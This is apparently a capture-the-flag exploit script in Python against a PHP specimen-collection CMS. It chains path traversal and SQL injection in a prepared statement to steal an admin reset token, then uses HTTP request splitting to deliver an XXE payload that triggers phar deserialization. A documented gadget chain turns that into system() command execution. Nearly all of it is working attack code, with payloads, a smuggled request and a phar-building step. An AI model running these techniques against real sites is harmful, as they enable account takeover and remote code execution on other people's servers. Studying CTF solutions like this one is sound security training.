"""
1. Path traversal -> SQLi in prepared statement -> admin ATO
2. HTTP Request Splitting -> XXE -> phar deserialization with custom gadget chain

Finding the gadget chain:

0. Entry point: Herbarium\\Specimens\\SpecimenCollector->__destruct() -> flush()
    flush() iterates $this->specimens which contains ImportPipelineRegistry
    Accessing $specimen['common_name'] triggers ImportPipelineRegistry->offsetGet('common_name')
1. ImportPipelineRegistry->offsetGet('common_name') - AOI gadget
    Instantiates Herbarium\\Core\\ResourceHandle via `new` (bypasses __wakeup)
2. ResourceHandle->__destruct() - ($this->_fn_close)() invokes ImportPipeline as a function
3. Herbarium\\Import\\ImportPipeline->__invoke() - iterates $this->components = [&$reg, 'resolve', &$this->results] (&reg is a referece to the previous ImportPipelineRegistry instance)
    3.1. $step = &$reg: `isset($step['result'])` -> `isset(&reg['result'])` -> triggers offsetGet('result') -> instantiates MiddlewareStack AOI gadget to bypass __wakeup, with stack=['close'=>$ip, 'system'] and handler='command ...' => $this->results = [MiddlewareStack]
    3.2. $step = 'resolve': not callable, pushed as-is => $this->results = [MiddlewareStack, 'resolve']
    3.3. $step = &$this->results: now equals [MiddlewareStack, 'resolve'] which is_callable
        `$step()` calls MiddlewareStack->resolve()
4. MiddlewareStack->resolve() -> 'system'($handler) -> system('command ...') -> RCE
"""

import requests
import re
import os
import subprocess
from urllib.parse import quote_from_bytes, quote_plus

# URL = "http://localhost:1337"
URL = "http://cmslop.challs.m0lecon.it:32768"
s = requests.Session()
s.proxies.update({"http":"http://localhost:8081"})

def register_login():
    user = os.urandom(8).hex()
    passw = os.urandom(8).hex()
    s.post(
        f"{URL}/register",
        data={"username": user, "display_name": user, "password": passw},
    )
    return s.post(f"{URL}/login", data={"username": user, "password": passw})


def request_reset_pw():
    return s.post(f"{URL}/forgot-password", data={"username": "admin"})

def reset_pw(token):
    return s.post(
        f"{URL}/reset-password",
        data={"token": token, "password": "xxxxxxxx", "password_confirm": "xxxxxxxx"},
    )


def login():
    return s.post(f"{URL}/login", data={"username": "admin", "password": "xxxxxxxx"})


# exploit path traversal + SQLi in SpecimenAnnotator::search prepared statement 
# https://slcyber.io/research-center/a-novel-technique-for-sql-injection-in-pdos-prepared-statements/
def get_reset_token():
    pt = "/annotations/search?q=%3F%00*%2F--+&species=UNION+SELECT+token+,2,3,4,5,6,7,8+FROM+password_reset_tokens/*"
    r = s.get(
        f"{URL}/collections/.."+quote_plus(quote_plus(pt))
    ).text
    return re.search(r"[a-z0-9]{64}", r)[0]



def craft_phar():
    os.system("php -d phar.readonly=0 chain.php")


# craft xml with a charset that bypasses the null byte restriction 
# https://github.com/GNOME/libxml2/blob/4b35628e97472eaf23d8a841d2f711f7c2f96255/include/libxml/encoding.h#L64
def xxe_payload():
    xxe = """<?xml version="1.0" encoding="IBM1047" ?>
<!DOCTYPE foo [<!ENTITY ent SYSTEM "phar:///var/www/html/uploads/avatars/avatar_1.gif">]>
<foo>&ent;</foo>
"""
    return subprocess.check_output(
        ["iconv", "-f", "UTF-8", "-t", "IBM1047"], input=xxe.encode("utf-8")
    )


def upload_avatar():
    return s.post(
        f"{URL}/profile/avatar",
        files={"avatar": ("out.gif", open("out.gif", "rb"), "image/jpeg")}
    )


# request splitting + xxe /api/admin/import/xml + deserialization -> RCE
def pwn():
    xxe = xxe_payload()
    smuggled = (
        f"\r\nConnection: keep-alive\r\n\r\n"
        f"POST /api/admin/import/xml HTTP/1.1\r\n"
        f"Host: localhost\r\n"
        f"Connection: keep-alive\r\n"
        f"Authorization: Bearer {s.cookies.get('herbarium_token')}\r\n"
        f"Content-Length: {len(xxe)}\r\n"
        f"\r\n"
    ).encode("ascii") + xxe
    requests.get(
        f"{URL}/profile",
        headers={"cookie": f"herbarium_token=a{quote_from_bytes(smuggled, safe='')}"},
    )


if __name__ == "__main__":
    # register and login
    register_login()

    # account takeover
    request_reset_pw()
    token = get_reset_token() # sqli
    reset_pw(token)

    s.cookies.clear()
    login() # login as admin

    # pwn
    craft_phar()
    upload_avatar()
    pwn()
